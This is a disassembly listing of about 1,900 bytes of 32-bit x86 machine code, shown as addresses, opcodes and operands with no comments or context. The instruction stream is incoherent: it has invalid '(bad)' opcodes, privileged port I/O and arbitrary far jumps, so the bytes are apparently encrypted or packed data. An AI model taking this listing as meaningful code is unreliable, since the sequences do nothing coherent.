  40e4bf:	jns    0x40e46d
  40e4c1:	fstp   QWORD PTR [ebx-0x10]
  40e4c4:	ret    
  40e4c5:	adc    al,0xed
  40e4c7:	cs pop es
  40e4c9:	cmp    dl,bh
  40e4cb:	mov    bl,0x97
  40e4cd:	xor    DWORD PTR [ebp-0x4f],0x81bc3b69
  40e4d4:	dec    esp
  40e4d5:	mov    ds:0xe7e2d406,eax
  40e4da:	and    eax,DWORD PTR [ebx]
  40e4dc:	dec    ecx
  40e4dd:	sbb    bh,BYTE PTR [edi+0x220f9945]
  40e4e3:	sub    al,0x70
  40e4e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4e6:	add    BYTE PTR [esi-0x3d88b613],ch
  40e4ec:	mov    ebp,0xd823f474
  40e4f1:	pop    ecx
  40e4f2:	imul   eax,DWORD PTR [ecx-0x498e3436],0x24
  40e4f9:	cld    
  40e4fa:	cmp    edx,DWORD PTR [ecx+0x529350d2]
  40e500:	aas    
  40e501:	push   esi
  40e502:	and    DWORD PTR [ebx+0x6c],edi
  40e505:	or     al,0x3b
  40e507:	push   cs
  40e508:	fsub   QWORD PTR [esi-0x64]
  40e50b:	cmp    edi,ecx
  40e50d:	mov    ch,0xf9
  40e50f:	neg    DWORD PTR [ebp+eiz*2+0x3bc2410b]
  40e516:	mov    edx,0x92d04a35
  40e51b:	test   eax,0x7cbac30d
  40e520:	mov    ds:0xf0a58d70,al
  40e525:	cdq    
  40e526:	cmp    edx,DWORD PTR [edx-0x6ff76c14]
  40e52c:	cli    
  40e52d:	(bad)  
  40e52f:	sbb    BYTE PTR [esi+0x67438e9a],dh
  40e535:	leave  
  40e536:	push   edx
  40e537:	add    esp,DWORD PTR cs:[ebp-0x779a7173]
  40e53e:	in     eax,0xdb
  40e540:	mov    BYTE PTR [ebp-0x79],ah
  40e543:	cli    
  40e544:	jmp    0x2229ca62
  40e549:	or     DWORD PTR [edx-0x33],eax
  40e54c:	(bad)  
  40e54d:	sti    
  40e54e:	push   esp
  40e54f:	xchg   ebx,eax
  40e550:	jo     0x40e543
  40e552:	sbb    eax,0xeb974df4
  40e557:	aam    0xf8
  40e559:	push   edx
  40e55a:	jbe    0x40e583
  40e55c:	or     al,0x0
  40e55e:	fs inc esp
  40e560:	repz add DWORD PTR [edi-0x13],0xffffff9c
  40e565:	push   0x80e90093
  40e56a:	jns    0x40e55d
  40e56c:	arpl   WORD PTR [esi-0x26bbaf87],bp
  40e572:	les    ebp,FWORD PTR [edi+0x51]
  40e575:	xchg   DWORD PTR [eax-0x53],edi
  40e578:	pop    ecx
  40e579:	ficom  DWORD PTR [ebp-0x1c5584e3]
  40e57f:	jb     0x40e5b7
  40e581:	cs retf 0x1380
  40e585:	test   al,0xf2
  40e587:	js     0x40e59b
  40e589:	sar    BYTE PTR [ebx-0x9e2bb4f],1
  40e58f:	and    eax,0xf308d5c2
  40e594:	ret    0xd4b5
  40e597:	sub    eax,0xa5559828
  40e59c:	outs   dx,DWORD PTR ds:[esi]
  40e59d:	push   esi
  40e59e:	outs   dx,BYTE PTR ds:[esi]
  40e59f:	jmp    0x40e5af
  40e5a1:	and    ch,BYTE PTR [ebp+0x37]
  40e5a4:	xor    BYTE PTR [edi],dl
  40e5a6:	mov    ebx,0x6258453
  40e5ab:	xor    BYTE PTR [eax],bh
  40e5ad:	test   DWORD PTR [ebx-0x31],edi
  40e5b0:	call   0xfc5cdb03
  40e5b5:	sub    DWORD PTR [edx],esp
  40e5b7:	fcomp  DWORD PTR [ebx-0x3a44807]
  40e5bd:	sti    
  40e5be:	fadd   st,st(5)
  40e5c0:	cmc    
  40e5c1:	or     ebx,edi
  40e5c3:	mov    al,ds:0x35010032
  40e5c8:	and    al,0x30
  40e5ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5cb:	inc    edx
  40e5cc:	xchg   edi,eax
  40e5cd:	mov    BYTE PTR [esi-0x46f671b4],dl
  40e5d3:	shr    DWORD PTR [edi],1
  40e5d5:	cmp    DWORD PTR [edx-0x60],esi
  40e5d8:	aaa    
  40e5d9:	mov    cl,0x51
  40e5db:	rol    BYTE PTR [esi],0xe1
  40e5de:	sub    DWORD PTR [esi+ecx*8-0x13af54c7],ebp
  40e5e5:	ds fwait
  40e5e7:	div    ch
  40e5e9:	idiv   DWORD PTR [edx]
  40e5eb:	aas    
  40e5ec:	xchg   ecx,eax
  40e5ed:	cli    
  40e5ee:	out    0x1e,al
  40e5f0:	aam    0x7
  40e5f2:	lods   al,BYTE PTR ds:[esi]
  40e5f3:	pop    ebp
  40e5f4:	(bad)  
  40e5f5:	mov    al,ds:0x1828719a
  40e5fa:	dec    BYTE PTR [ebp-0x70d49754]
  40e600:	aad    0x77
  40e602:	hlt    
  40e603:	cmp    eax,0xceab096f
  40e608:	ret    
  40e609:	and    eax,0xc5843d62
  40e60e:	xor    eax,0xca4fd4bb
  40e613:	mov    ebp,0xf0a10ba4
  40e618:	push   es
  40e619:	dec    esp
  40e61a:	xchg   edx,eax
  40e61b:	cdq    
  40e61c:	call   0x5fef:0x9e9a22bd
  40e623:	sbb    dl,BYTE PTR [ebp+0x37f3ec40]
  40e629:	xchg   ebp,edi
  40e62b:	xchg   esi,eax
  40e62c:	and    al,0x71
  40e62e:	dec    eax
  40e62f:	dec    esi
  40e630:	push   0xffffffce
  40e632:	imul   ecx,DWORD PTR [ebx+edx*4-0x6b],0x137ed01a
  40e63a:	outs   dx,DWORD PTR ds:[esi]
  40e63b:	inc    edx
  40e63c:	arpl   WORD PTR [ecx-0x43],dx
  40e63f:	sbb    edi,DWORD PTR [ecx-0x3ca90b33]
  40e645:	push   ss
  40e646:	add    DWORD PTR [esi+0x7ac2f903],0xffffffef
  40e64d:	adc    al,BYTE PTR ss:[edx+0x34]
  40e651:	in     al,dx
  40e652:	retf   0x704b
  40e655:	cli    
  40e656:	shl    DWORD PTR [eax],1
  40e658:	xchg   ebp,eax
  40e659:	ror    DWORD PTR [ecx+0x70],0x2d
  40e65d:	inc    ebp
  40e65e:	(bad)  
  40e65f:	push   ebx
  40e660:	dec    edi
  40e661:	in     al,0x7c
  40e663:	(bad)  
  40e664:	jmp    DWORD PTR [ebp+esi*2+0x22860d92]
  40e66b:	clc    
  40e66c:	inc    edx
  40e66d:	inc    ecx
  40e66e:	sbb    eax,0xf10e8e35
  40e673:	inc    esp
  40e674:	repz ss xor esi,0x47
  40e679:	icebp  
  40e67a:	seta   BYTE PTR [ebp-0xf]
  40e67e:	jmp    0x779a:0x52644dd
  40e685:	data16 jae 0x40e662
  40e688:	(bad)  
  40e689:	aas    
  40e68a:	cmp    edi,DWORD PTR [eax+0x6f4dda51]
  40e690:	or     esp,DWORD PTR [ebx-0x792c6173]
  40e696:	dec    ebp
  40e697:	lock mov cl,0x9d
  40e69a:	sar    ebp,1
  40e69c:	mov    esi,DWORD PTR [edx]
  40e69e:	or     cl,BYTE PTR [ecx]
  40e6a0:	push   edi
  40e6a1:	push   cs
  40e6a2:	std    
  40e6a3:	popf   
  40e6a4:	jo     0x40e66e
  40e6a6:	pusha  
  40e6a7:	add    al,0x3c
  40e6a9:	adc    al,0xc4
  40e6ab:	and    DWORD PTR [bp+0x3db],edi
  40e6b0:	inc    ebx
  40e6b1:	in     al,0xed
  40e6b3:	arpl   WORD PTR [edi-0x5b3f639a],bp
  40e6b9:	scas   al,BYTE PTR es:[edi]
  40e6ba:	jae    0x40e70b
  40e6bc:	sub    BYTE PTR [eax-0x5b],cl
  40e6bf:	mov    al,0xce
  40e6c1:	push   0x49f71cb1
  40e6c6:	adc    ah,dl
  40e6c8:	mov    ebp,0x4422acce
  40e6cd:	jg     0x40e6c1
  40e6cf:	pop    ds
  40e6d0:	cmp    BYTE PTR [ebx-0x6],0x2a
  40e6d4:	cwde   
  40e6d5:	shr    DWORD PTR [ebp+eiz*8-0x5e4f47cc],cl
  40e6dc:	das    
  40e6dd:	xchg   ebx,eax
  40e6de:	mov    eax,0xa34247d2
  40e6e3:	xchg   edx,eax
  40e6e4:	add    ecx,esp
  40e6e6:	push   ecx
  40e6e7:	cmp    edx,DWORD PTR [esi-0x17]
  40e6ea:	mov    ds:0xf0cff56f,al
  40e6ef:	ret    0x2069
  40e6f2:	sti    
  40e6f3:	sbb    bl,bl
  40e6f5:	and    BYTE PTR [esi],cl
  40e6f7:	int    0x60
  40e6f9:	test   DWORD PTR [edx+0x2d3c9ffb],eax
  40e6ff:	jp     0x40e6b0
  40e701:	iret   
  40e702:	sub    edi,esp
  40e704:	or     eax,0xbbfeb08b
  40e709:	fsubr  QWORD PTR [ebx]
  40e70b:	pop    eax
  40e70c:	aas    
  40e70d:	jl     0x40e714
  40e70f:	adc    eax,ebx
  40e711:	cs mov ch,0x24
  40e714:	add    dl,0x7a
  40e717:	mov    esi,0xf164a2fd
  40e71c:	xchg   esp,eax
  40e71d:	hlt    
  40e71e:	pop    ss
  40e71f:	popa   
  40e720:	cld    
  40e721:	shl    DWORD PTR [ecx+0x4a964735],1
  40e727:	fst    DWORD PTR [eax]
  40e729:	xor    ah,BYTE PTR [edx+ebp*4]
  40e72c:	pop    esp
  40e72d:	fidiv  DWORD PTR [ebx-0x22a228e5]
  40e733:	dec    ecx
  40e734:	inc    edx
  40e735:	out    0x9,al
  40e737:	xchg   DWORD PTR [ecx-0x71705b51],ebx
  40e73d:	jns    0x40e7b1
  40e73f:	sub    DWORD PTR [eax],ebx
  40e741:	push   esi
  40e742:	xchg   ecx,eax
  40e743:	in     eax,dx
  40e744:	out    0x89,eax
  40e746:	pushf  
  40e747:	sti    
  40e748:	mov    DWORD PTR [ebp+eax*2-0x73853a85],edx
  40e74f:	jmp    0x40e74e
  40e751:	scas   eax,DWORD PTR es:[edi]
  40e752:	dec    ecx
  40e753:	rcl    eax,cl
  40e755:	push   edi
  40e756:	bound  eax,QWORD PTR [ebx+0x7fc4b8f3]
  40e75c:	jl     0x40e7a1
  40e75e:	rcl    bh,cl
  40e760:	mov    al,ds:0xd4d0fd
  40e765:	jne    0x40e735
  40e767:	dec    esp
  40e768:	add    eax,0x24907e37
  40e76d:	push   edx
  40e76e:	mov    BYTE PTR [ecx],dl
  40e770:	add    al,0xf4
  40e772:	pop    ecx
  40e773:	inc    ebx
  40e774:	and    DWORD PTR ds:0x2aeb18c5,esi
  40e77a:	jmp    0x40e6fc
  40e77c:	rol    BYTE PTR [esi+0x51],1
  40e77f:	push   cs
  40e780:	(bad)  
  40e781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e782:	xchg   esp,eax
  40e783:	adc    al,0xc6
  40e785:	adc    esi,DWORD PTR [ebx]
  40e787:	dec    ebp
  40e788:	stos   DWORD PTR es:[edi],eax
  40e789:	mov    WORD PTR [ecx+0x20],ds
  40e78c:	jne    0x40e7ab
  40e78e:	xchg   edi,eax
  40e78f:	dec    ecx
  40e790:	(bad)  
  40e791:	jnp    0x40e726
  40e793:	mov    eax,0x31f913c
  40e798:	dec    edx
  40e799:	sbb    al,0xf7
  40e79b:	add    bl,BYTE PTR [ebp+0x5ffb731e]
  40e7a1:	sub    ecx,edi
  40e7a3:	adc    esi,ecx
  40e7a5:	aaa    
  40e7a6:	ds sbb dl,cl
  40e7a9:	mov    BYTE PTR [ecx],0x75
  40e7ac:	in     al,dx
  40e7ad:	(bad)  
  40e7ae:	js     0x40e7f2
  40e7b0:	scas   al,BYTE PTR es:[edi]
  40e7b1:	xlat   BYTE PTR ds:[ebx]
  40e7b2:	xchg   esp,eax
  40e7b3:	cmc    
  40e7b4:	dec    DWORD PTR [esi+eax*4]
  40e7b7:	stos   DWORD PTR es:[edi],eax
  40e7b8:	push   0x3d7b94b4
  40e7bd:	stos   DWORD PTR es:[edi],eax
  40e7be:	ja     0x40e7d6
  40e7c0:	arpl   si,dx
  40e7c2:	cmp    eax,DWORD PTR [ebx-0x34716e46]
  40e7c8:	call   0x777414fa
  40e7cd:	in     al,0x13
  40e7cf:	ss or  al,0xe6
  40e7d2:	div    BYTE PTR [eax-0x66]
  40e7d5:	pop    ebp
  40e7d6:	push   ss
  40e7d7:	sbb    al,0x9
  40e7d9:	mov    eax,0x211db696
  40e7de:	data16 sbb BYTE PTR [edi+0x57],dh
  40e7e2:	shr    bl,1
  40e7e4:	fcmovnbe st,st(5)
  40e7e6:	cld    
  40e7e7:	aam    0xd0
  40e7e9:	mov    bh,0xd5
  40e7eb:	cmp    DWORD PTR [esi],ecx
  40e7ed:	xor    al,0x20
  40e7ef:	pop    ss
  40e7f0:	or     BYTE PTR [ebx-0x32],0xc0
  40e7f4:	iret   
  40e7f5:	adc    ecx,DWORD PTR [ebx-0x2e]
  40e7f8:	push   edx
  40e7f9:	shr    DWORD PTR [edx],1
  40e7fb:	mov    esi,0x5ce65c9
  40e800:	loope  0x40e7c7
  40e802:	test   edx,0xf46275b7
  40e808:	daa    
  40e809:	mov    al,0xdf
  40e80b:	and    DWORD PTR [esi+0x1145e829],esp
  40e811:	push   esp
  40e812:	(bad)  [eax]
  40e814:	test   DWORD PTR [ebx],ebx
  40e816:	mov    eax,ds:0x4bacfeff
  40e81b:	stos   BYTE PTR es:[edi],al
  40e81c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e81d:	mov    al,ds:0x826f6701
  40e822:	sub    edi,DWORD PTR [ebp+0x795013e]
  40e828:	xchg   ebx,eax
  40e829:	mov    WORD PTR [edi+0x2a],ss
  40e82c:	mov    dl,0x0
  40e82e:	push   edx
  40e82f:	int    0x2d
  40e831:	mov    ebp,0x6c353b55
  40e836:	or     bh,0x27
  40e839:	sbb    DWORD PTR [ebx+0x40c1310f],ebx
  40e83f:	mov    DWORD PTR [edx-0x46],esp
  40e842:	retf   0x26a3
  40e845:	sub    dl,dh
  40e847:	jbe    0x40e853
  40e849:	jno    0x40e801
  40e84b:	repnz int 0x2d
  40e84e:	mov    bl,0x3e
  40e850:	sbb    ebx,eax
  40e852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e853:	fisttp DWORD PTR [eax+esi*2-0x51]
  40e857:	dec    ebx
  40e858:	cs sahf 
  40e85a:	and    al,0x87
  40e85c:	dec    edi
  40e85d:	call   0xc22aa8fb
  40e862:	sub    DWORD PTR [ebx-0x7d],ecx
  40e865:	add    DWORD PTR [ebp-0x16e1d379],0xffffffe1
  40e86c:	test   DWORD PTR [ecx-0x7695f575],0x2198cd73
  40e876:	jb     0x40e827
  40e878:	or     BYTE PTR ds:0x716810ba,dh
  40e87e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e87f:	ds cdq 
  40e881:	mov    ecx,0xb01f404a
  40e886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e887:	jmp    0x40e8e8
  40e889:	inc    edi
  40e88a:	sbb    esi,ecx
  40e88c:	xor    al,0x63
  40e88e:	paddb  mm6,QWORD PTR [edx+0x25]
  40e892:	sbb    BYTE PTR [ebp-0x6b39a08f],cl
  40e898:	shl    BYTE PTR [ebp+0x7],1
  40e89b:	jge    0x40e842
  40e89d:	mov    al,ds:0x6752b3d
  40e8a2:	jl     0x40e8ea
  40e8a4:	in     al,dx
  40e8a5:	mov    al,0x1
  40e8a7:	sar    DWORD PTR [ebp+0x2fe77953],0xe6
  40e8ae:	pop    ebp
  40e8af:	mov    ebx,eax
  40e8b1:	and    bh,BYTE PTR [ebp+0x5075dbc]
  40e8b7:	mov    esi,0xe646e081
  40e8bc:	adc    cl,bh
  40e8be:	daa    
  40e8bf:	mov    WORD PTR [edx],ds
  40e8c1:	mov    WORD PTR [eax+0x157ce11c],fs
  40e8c7:	in     eax,dx
  40e8c8:	out    0x76,eax
  40e8ca:	mov    esp,0x5ede6eab
  40e8cf:	adc    DWORD PTR [ebx-0x2dd89545],0x68
  40e8d6:	(bad)  
  40e8d7:	xor    al,0xc
  40e8d9:	dec    edi
  40e8da:	push   0x9a5e057f
  40e8df:	popa   
  40e8e0:	ins    DWORD PTR es:[edi],dx
  40e8e1:	and    DWORD PTR [ecx],esi
  40e8e3:	jae    0x40e942
  40e8e5:	fs pop es
  40e8e7:	es xchg edx,eax
  40e8e9:	xor    DWORD PTR [ecx-0x3a907ed3],edi
  40e8ef:	xor    dh,BYTE PTR [esi+0xe2a08f]
  40e8f5:	jnp    0x40e93c
  40e8f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8f8:	xor    al,0x4b
  40e8fa:	repz iret 
  40e8fc:	call   0xb623:0x63f72c3
  40e903:	idiv   DWORD PTR [ebx-0xa]
  40e906:	xchg   ecx,eax
  40e907:	loop   0x40e929
  40e909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e90a:	pop    edi
  40e90b:	repnz inc esi
  40e90d:	xchg   edi,eax
  40e90e:	out    dx,eax
  40e90f:	retf   0x7bec
  40e912:	mov    cl,0x78
  40e914:	imul   edi,DWORD PTR [eax],0xcadaf49d
  40e91a:	push   eax
  40e91b:	scas   eax,DWORD PTR es:[edi]
  40e91c:	inc    edi
  40e91d:	cli    
  40e91e:	jns    0x40e8fe
  40e920:	inc    ebp
  40e921:	loope  0x40e916
  40e923:	scas   al,BYTE PTR es:[edi]
  40e924:	jl     0x40e91e
  40e926:	fisttp DWORD PTR [edx+0x5b]
  40e929:	or     ebx,eax
  40e92b:	imul   ebp,ebp,0xddd188a9
  40e931:	call   0xd4448d1e
  40e936:	gs nop
  40e938:	(bad)  
  40e939:	fisttp WORD PTR [esi-0x12]
  40e93c:	stos   DWORD PTR es:[edi],eax
  40e93d:	mov    DWORD PTR [eax+eiz*8-0x24],ecx
  40e941:	and    edi,DWORD PTR [esi+0xc98e420]
  40e947:	or     DWORD PTR [ebp+0x550a47f0],0x16
  40e94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e94f:	sbb    eax,0xd5a6b95e
  40e954:	add    al,dl
  40e956:	lahf   
  40e957:	and    eax,esi
  40e959:	lock xor eax,0xfef48187
  40e95f:	mov    ebp,0xd13cd0c1
  40e964:	bound  ebp,QWORD PTR [esp+ebx*1]
  40e967:	mov    ?,WORD PTR ds:0xfa5a725
  40e96d:	aaa    
  40e96e:	pop    esi
  40e96f:	jne    0x40e99b
  40e971:	push   eax
  40e972:	jmp    0x6c2ff808
  40e977:	pushf  
  40e978:	pop    edx
  40e979:	mov    dl,BYTE PTR [edi-0x6b3e4911]
  40e97f:	outs   dx,BYTE PTR ds:[esi]
  40e980:	xlat   BYTE PTR ds:[ebx]
  40e981:	hlt    
  40e982:	push   ss
  40e983:	or     eax,esi
  40e985:	cdq    
  40e986:	add    ah,cl
  40e988:	retf   
  40e989:	in     al,dx
  40e98a:	enter  0xe295,0xc1
  40e98e:	cmp    BYTE PTR [ebp-0xc],bh
  40e991:	sub    al,0xc9
  40e993:	test   DWORD PTR [esi-0x28],ebp
  40e996:	push   ss
  40e997:	push   cs
  40e998:	mov    edx,0x44dd6e8b
  40e99d:	fwait
  40e99e:	rcl    DWORD PTR [esi+0x59],1
  40e9a1:	ficomp WORD PTR [eax+ebp*8-0x63]
  40e9a5:	pop    ecx
  40e9a6:	xlat   BYTE PTR ds:[ebx]
  40e9a7:	jne    0x40e95a
  40e9a9:	(bad)  
  40e9aa:	repnz cmp BYTE PTR [ecx-0x3],ch
  40e9ae:	xchg   BYTE PTR [edi],dl
  40e9b0:	cmp    DWORD PTR [ebp-0x4a8b852b],esi
  40e9b6:	add    DWORD PTR [ebx-0x50],0xffffffa8
  40e9ba:	sbb    dl,dl
  40e9bc:	cmc    
  40e9bd:	cwde   
  40e9be:	sahf   
  40e9bf:	ins    BYTE PTR es:[edi],dx
  40e9c0:	lock clc 
  40e9c2:	fiadd  DWORD PTR [esi]
  40e9c4:	fldenv [edx+0x74fc84d0]
  40e9ca:	inc    esi
  40e9cb:	jle    0x40e9cc
  40e9cd:	into   
  40e9ce:	mov    eax,ds:0xae994776
  40e9d4:	(bad)  
  40e9d5:	pop    ebx
  40e9d6:	sub    BYTE PTR [edi+0x111f0a7],ah
  40e9dc:	or     al,0x55
  40e9de:	xor    ebx,ebp
  40e9e0:	xor    dh,al
  40e9e2:	mov    bl,0xb1
  40e9e4:	dec    esi
  40e9e6:	fisttp WORD PTR [edi]
  40e9e8:	jo     0x40ea28
  40e9ea:	pop    edi
  40e9eb:	icebp  
  40e9ec:	lods   eax,DWORD PTR ds:[esi]
  40e9ed:	dec    esi
  40e9ee:	addr16 sbb eax,0x9c2874dd
  40e9f4:	or     eax,0xe40d837b
  40e9f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9fa:	imul   edi,DWORD PTR [bp+0x2787],0x5a449fe0
  40ea03:	fidiv  WORD PTR [edx+0x13]
  40ea06:	mov    al,ds:0x80e15b4d
  40ea0b:	inc    ebp
  40ea0c:	iret   
  40ea0d:	adc    eax,0xe041b025
  40ea12:	test   BYTE PTR [esi-0x22],bl
  40ea15:	scas   eax,DWORD PTR es:[edi]
  40ea16:	cld    
  40ea17:	jns    0x40ea6d
  40ea19:	sub    ah,ch
  40ea1b:	jbe    0x40ea26
  40ea1d:	jecxz  0x40ea1a
  40ea1f:	jno    0x40ea54
  40ea21:	div    BYTE PTR [eax]
  40ea23:	dec    ebx
  40ea24:	push   esi
  40ea25:	in     al,dx
  40ea26:	jae    0x40e9ac
  40ea28:	lea    esi,[ebx-0xe]
  40ea2b:	jnp    0x40e9f5
  40ea2d:	push   esi
  40ea2e:	in     al,0x66
  40ea30:	ret    0x552a
  40ea33:	lea    ebx,[ecx+0x71]
  40ea36:	sbb    DWORD PTR [esi],edx
  40ea38:	jecxz  0x40ea02
  40ea3a:	ret    
  40ea3b:	mov    ebp,0xd305e0f3
  40ea40:	jge    0x40e9e0
  40ea42:	add    bl,BYTE PTR [ecx]
  40ea44:	jbe    0x40eab8
  40ea46:	cmp    al,BYTE PTR [ebp+0x2affdf5d]
  40ea4c:	test   ebx,0x76fc1ee3
  40ea52:	mov    edi,0x4c6b5aaa
  40ea57:	add    ah,al
  40ea59:	adc    ebp,esi
  40ea5b:	adc    edx,ecx
  40ea5d:	dec    eax
  40ea5e:	stos   BYTE PTR es:[edi],al
  40ea5f:	adc    ecx,DWORD PTR [ebx-0x2d]
  40ea62:	xchg   ecx,eax
  40ea63:	imul   BYTE PTR [ebx+eiz*4-0x7bfb1]
  40ea6a:	outs   dx,DWORD PTR ds:[esi]
  40ea6b:	in     al,dx
  40ea6c:	jmp    0x98dc:0x26f6bfff
  40ea73:	and    eax,0x4032209d
  40ea78:	jbe    0x40ea82
  40ea7a:	rcr    DWORD PTR [ecx],1
  40ea7c:	(bad)  
  40ea7e:	inc    ebx
  40ea7f:	shl    DWORD PTR [edi],1
  40ea81:	mov    ecx,0xdf979c92
  40ea86:	fimul  DWORD PTR [edx+0x4]
  40ea89:	push   ebx
  40ea8a:	sbb    BYTE PTR [edx+0x7d],bh
  40ea8d:	(bad)  
  40ea90:	jno    0x40eac3
  40ea92:	jns    0x40eb13
  40ea94:	push   0x8a321b24
  40ea99:	test   BYTE PTR cs:[edi-0x21da7ab5],ah
  40eaa0:	pop    esi
  40eaa1:	fild   WORD PTR [esi-0x28e0f670]
  40eaa7:	lahf   
  40eaa8:	ds call 0xd0208797
  40eaae:	adc    esi,DWORD PTR [edx-0x3e]
  40eab1:	xchg   esi,eax
  40eab2:	cli    
  40eab3:	sub    BYTE PTR [ebx+0x713b5bf7],0x6b
  40eaba:	push   0xad504cd2
  40eabf:	xchg   ebp,eax
  40eac0:	test   BYTE PTR [eax-0x1f],0xb1
  40eac4:	inc    edi
  40eac5:	pop    ecx
  40eac6:	pop    es
  40eac7:	push   ecx
  40eac8:	in     al,dx
  40eac9:	out    0x0,eax
  40eacb:	(bad)  
  40eacc:	lea    eax,[edx-0xaccee8f]
  40ead2:	jmp    0x40eb16
  40ead4:	rcl    BYTE PTR [edx],cl
  40ead6:	sbb    bl,ah
  40ead8:	mov    cl,0x82
  40eada:	push   ebp
  40eadb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eadc:	dec    eax
  40eadd:	and    DWORD PTR [esi+eiz*2+0x209847d3],0xbc670fae
  40eae8:	iret   
  40eae9:	jno    0x40eb44
  40eaeb:	jmp    0xc53e:0xd605f8f5
  40eaf2:	stc    
  40eaf3:	mov    BYTE PTR [ebx],ch
  40eaf5:	mov    edi,0xd02a543c
  40eafa:	dec    eax
  40eafb:	fist   DWORD PTR [esi-0xf]
  40eafe:	mov    eax,ds:0x464e7e58
  40eb03:	dec    edi
  40eb04:	mov    edx,0xdaa7ac0f
  40eb09:	cmp    BYTE PTR [edi+0x14efb8d2],0x1d
  40eb10:	inc    ebx
  40eb11:	pop    esp
  40eb12:	outs   dx,DWORD PTR ds:[esi]
  40eb13:	add    esp,DWORD PTR [edi-0x14]
  40eb16:	dec    ecx
  40eb17:	mov    dh,0x66
  40eb19:	cmp    al,cl
  40eb1b:	xchg   DWORD PTR [esi+0x1],esi
  40eb1e:	pop    ds
  40eb1f:	dec    esp
  40eb20:	retf   0xc3f9
  40eb23:	xchg   esi,eax
  40eb24:	inc    edi
  40eb25:	lahf   
  40eb26:	sbb    ch,BYTE PTR [esi+0x1d]
  40eb29:	push   0x43
  40eb2b:	ss pop ecx
  40eb2d:	arpl   WORD PTR [ecx+edx*2+0x44],bp
  40eb31:	mov    ds:0x81ebffec,eax
  40eb36:	mov    ss,esi
  40eb38:	pusha  
  40eb39:	fcomp  DWORD PTR [ebx+edx*4]
  40eb3c:	repnz (bad)
  40eb3f:	in     eax,0x53
  40eb41:	adc    eax,edi
  40eb43:	loopne 0x40eba6
  40eb45:	xchg   DWORD PTR [ecx+0x40f8f599],esi
  40eb4b:	out    dx,al
  40eb4c:	mov    al,ds:0xaf2ecea3
  40eb51:	pop    ebp
  40eb52:	popf   
  40eb53:	push   esp
  40eb54:	push   ebx
  40eb56:	dec    ecx
  40eb57:	jb     0x40eb7a
  40eb59:	loope  0x40eaff
  40eb5b:	pop    ebx
  40eb5c:	cwde   
  40eb5d:	xchg   ebx,eax
  40eb5e:	ins    DWORD PTR es:[edi],dx
  40eb5f:	pop    esi
  40eb60:	or     bl,bl
  40eb62:	or     bl,dl
  40eb64:	stos   DWORD PTR es:[edi],eax
  40eb65:	or     esi,DWORD PTR [eax+0x76]
  40eb68:	rcr    edx,cl
  40eb6a:	or     DWORD PTR ss:[eax+0x64],0x41
  40eb6f:	aas    
  40eb70:	data16 or ah,BYTE PTR [esi-0x707c9e3a]
  40eb77:	dec    ecx
  40eb78:	xchg   BYTE PTR [ebp-0x2eb5ae9],al
  40eb7e:	adc    ebx,eax
  40eb80:	cwde   
  40eb81:	(bad)  
  40eb82:	jbe    0x40ebbe
  40eb84:	lea    ebx,[ebp+0x38]
  40eb87:	nop
  40eb88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb8a:	ins    BYTE PTR es:[edi],dx
  40eb8b:	iret   
  40eb8c:	ins    DWORD PTR es:[edi],dx
  40eb8d:	fcmovb st,st(7)
  40eb8f:	mov    eax,ds:0xdfd30748
  40eb94:	test   BYTE PTR [edx+eiz*8-0x4f],bl
  40eb98:	xchg   ecx,eax
  40eb99:	add    edi,DWORD PTR [eax-0xa]
  40eb9c:	fs push esi
  40eb9e:	pop    ecx
  40eb9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eba0:	inc    ebx
  40eba1:	xchg   esi,eax
  40eba2:	push   ecx
  40eba3:	dec    eax
  40eba4:	xchg   ecx,eax
  40eba5:	ds xchg edi,eax
  40eba7:	and    ah,BYTE PTR [edx-0x1f80ed8b]
  40ebad:	mov    eax,ds:0x92676761
  40ebb2:	sub    BYTE PTR [ebp-0x17],0x90
  40ebb6:	(bad)  
  40ebb7:	mov    dh,0x50
  40ebb9:	scas   al,BYTE PTR es:[edi]
  40ebba:	mov    esi,0x23eb3231
  40ebbf:	and    al,0x41
  40ebc1:	pop    es
  40ebc2:	imul   ecx,DWORD PTR [ecx],0x74
  40ebc5:	inc    esp
  40ebc6:	inc    ebp
  40ebc7:	pop    ds
  40ebc8:	jp     0x40ec07
  40ebca:	retf   0x883d
  40ebcd:	ret    0xd7a2
  40ebd0:	cld    
  40ebd1:	add    ah,BYTE PTR [ebp-0x4800979a]
  40ebd7:	ds or  BYTE PTR ss:[ecx],cl
  40ebdb:	dec    eax
  40ebdc:	sub    ch,BYTE PTR [ebx+ebx*2]
  40ebdf:	lds    esp,FWORD PTR [ebp+0x9]
  40ebe2:	into   
  40ebe3:	test   eax,0x2a8f86ea
  40ebe8:	ret    0x71fa
  40ebeb:	in     eax,dx
  40ebec:	mov    ecx,0xf2baf632
  40ebf1:	test   eax,0xab1a8f57
  40ebf6:	or     al,0xf4
  40ebf8:	and    DWORD PTR [edi-0x59],esi
  40ebfb:	call   0x97608720
  40ec00:	mov    dl,0x9c
  40ec02:	cmp    eax,0x563b999c
  40ec07:	xlat   BYTE PTR ds:[ebx]
  40ec08:	sub    ebx,ebx
  40ec0a:	add    dh,dl
  40ec0c:	cmp    eax,0x4094b26c
  40ec11:	cmp    edx,ebx
  40ec13:	scas   al,BYTE PTR es:[edi]
  40ec14:	pop    ebx
  40ec15:	mov    dl,0x0
  40ec17:	sub    dl,BYTE PTR [ecx]
  40ec19:	mov    eax,ds:0xb0cb3d38
  40ec1e:	repz jle 0x40ec08
  40ec21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec22:	add    eax,DWORD PTR [eax+0x1e]
  40ec25:	mov    ch,0x40
  40ec27:	jno    0x40ec62
  40ec29:	push   esi
